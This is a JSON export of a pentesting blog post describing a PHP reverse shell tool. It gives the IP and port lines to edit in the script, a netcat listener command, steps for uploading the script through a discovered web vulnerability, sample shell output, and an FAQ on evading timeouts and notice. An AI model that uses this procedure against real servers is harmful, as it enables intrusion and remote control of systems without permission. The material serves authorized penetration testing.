{"id":111,"date":"2007-05-26T17:01:40","date_gmt":"2007-05-26T17:01:40","guid":{"rendered":"http:\/\/pentestmonkey.net\/?p=111"},"modified":"2013-01-20T00:10:15","modified_gmt":"2013-01-20T00:10:15","slug":"php-reverse-shell","status":"publish","type":"post","link":"https:\/\/pentestmonkey.net\/tools\/web-shells\/php-reverse-shell","title":{"rendered":"php-reverse-shell"},"content":{"rendered":"<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP.\u00a0 Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.\u00a0 The script will open an outbound TCP connection from the webserver to a host and port of your choice.\u00a0 Bound to this TCP connection will be a shell.<\/p>\n<p>This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.\u00a0 It differs from web form-based shell which allow you to send a single command, then return you the output.<br \/>\n<!--more--><\/p>\n<h2>Download<\/h2>\n<p><a href=\"http:\/\/pentestmonkey.net\/tools\/php-reverse-shell\/php-reverse-shell-1.0.tar.gz\">php-reverse-shell-1.0.tar.gz<\/a><\/p>\n<p>MD5sum:2bdf99cee7b302afdc45d1d51ac7e373<\/p>\n<p>SHA1sum: 30a26d5b5e30d819679e0d1eb44e46814892a4ee<\/p>\n<h2>Video<\/h2>\n<p>I stumbled across this\u00a0<a href=\"http:\/\/www.youtube.com\/watch?v=A0Ks4MfhVIE\">video<\/a> someone made of php-reverse-shell.<\/p>\n<p><em>Update 2011-11: Imax sent me a link to his tool\u00a0<a href=\"http:\/\/code.google.com\/p\/fimap\/\">fimap<\/a>\u00a0which uses php-reverse-shell. \u00a0Looks cool.<\/em><\/p>\n<h2>Walk Through<\/h2>\n<h3>Modify the source<\/h3>\n<p>To prevent someone else from abusing your backdoor &#8211; a nightmare scenario while pentesting &#8211; you need to modify the source code to indicate where you want the reverse shell thrown back to.\u00a0 Edit the following lines of php-reverse-shell.php:<\/p>\n<pre>$ip = '127.0.0.1';  \/\/ CHANGE THIS\r\n$port = 1234;       \/\/ CHANGE THIS<\/pre>\n<h3>Get Ready to catch the reverse shell<\/h3>\n<p>Start a TCP listener on a host and port that will be accessible by the web server.\u00a0 Use the same port here as you specified in the script (1234 in this example):<\/p>\n<pre>$ nc -v -n -l -p 1234<\/pre>\n<h3>Upload and Run the script<\/h3>\n<p>Using whatever vulnerability you&#8217;ve discovered in the website, upload php-reverse-shell.php.\u00a0 Run the script simply by browsing to the newly uploaded file in your web browser (NB: You won&#8217;t see any output on the web page, it&#8217;ll just hang if successful):<\/p>\n<pre>http:\/\/somesite\/php-reverse-shell.php<\/pre>\n<h3>Enjoy your new shell<\/h3>\n<p>If all went well, the web server should have thrown back a shell to your netcat listener.\u00a0 Some useful commans such as w, uname -a, id and pwd are run automatically for you:<\/p>\n<pre>$ nc -v -n -l -p 1234\r\nlistening on [any] 1234 ...\r\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58012\r\nLinux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU\/Linux\r\n 16:59:28 up 39 days, 19:54,  2 users,  load average: 0.18, 0.13, 0.10\r\nUSER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT\r\nroot   :0        19May07 ?xdm?   5:10m  0.01s \/bin\/sh\r\nuid=81(apache) gid=81(apache) groups=81(apache)\r\nsh: no job control in this shell\r\nsh-3.2$<\/pre>\n<h2>FAQs<\/h2>\n<h3>When is this useful?<\/h3>\n<p>Perhaps the only areas on disk that you have write access to are mounted with the &#8220;noexec&#8221; option.\u00a0 Uploading a compiled program will be of no use in these situations.\u00a0 You need to use an installed scripting language like Python, PERL, PHP, etc.<br \/>\nPerhaps you just can&#8217;t be bothered to upload a second program.<\/p>\n<h3>Isn&#8217;t the shell connection just going to be severed when the web server times out the PHP script?<\/h3>\n<p>No.\u00a0 It doesn&#8217;t seem to on the systems that I&#8217;ve tested it on (Gentoo Linux only so far).\u00a0 Additionally the PHP script attempts to daemonise itself and dissociate from the parent process to avoid this (though it rarely works in practise).\u00a0 Your browser will appear to hang when you access the reverse shell.\u00a0 This is normal.\u00a0 It&#8217;s OK to hit cancel in your browser once you&#8217;ve got your shell.<\/p>\n<h3>Isn&#8217;t there going to be a rather suspicious looking shell process when the admin runs &#8220;ps&#8221;?<\/h3>\n<p>Yeah.\u00a0 This version of the reverse shell isn&#8217;t very subtle:<\/p>\n<pre>apache   28106  0.0  0.0  10428  1216 ?        S    17:15   0:00 sh -c uname -a; w; id; \/bin\/sh -i\r\napache   28110  0.0  0.0  10172  1428 ?        S    17:15   0:00 \/bin\/sh -i<\/pre>\n<h3>Is this page available in Serbo-Croatian?<\/h3>\n<p>Yes. <a href=\"http:\/\/science.webhostinggeeks.com\/php-obrnute-ljusture\">Thanks to Jovana Milutinovich for translating<\/a>.<\/p>\n<h2>Caveats<\/h2>\n<p>Outbound firewalling (aka egress filtering) may prevent your reverse shell connection reaching you.\u00a0 Pick a port that&#8217;s allowed through Firewall.\u00a0 If there are none, you&#8217;ll have to make do with a form-based PHP shell.<\/p>\n<p>This particular implementation of the reverse shell is unix-based.\u00a0 You&#8217;ll need to modify it before it will work on windows.<\/p>\n<p>I&#8217;ve noticed a couple of zombie processes while testing this shell.\u00a0 It doesn&#8217;t always happen, but is probably to be expected since we&#8217;re not daemonising ourself properly.<\/p>\n","protected":false},"excerpt":{"rendered":"<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP.\u00a0 Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.\u00a0 The script will open an outbound TCP connection from the webserver to a host [&hellip;]<\/p>\n","protected":false},"author":3,"featured_media":0,"comment_status":"open","ping_status":"open","sticky":false,"template":"","format":"standard","meta":[],"categories":[15],"tags":[19,53,56,76],"_links":{"self":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/111"}],"collection":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/users\/3"}],"replies":[{"embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/comments?post=111"}],"version-history":[{"count":7,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/111\/revisions"}],"predecessor-version":[{"id":174,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/posts\/111\/revisions\/174"}],"wp:attachment":[{"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/media?parent=111"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/categories?post=111"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/pentestmonkey.net\/wp-json\/wp\/v2\/tags?post=111"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}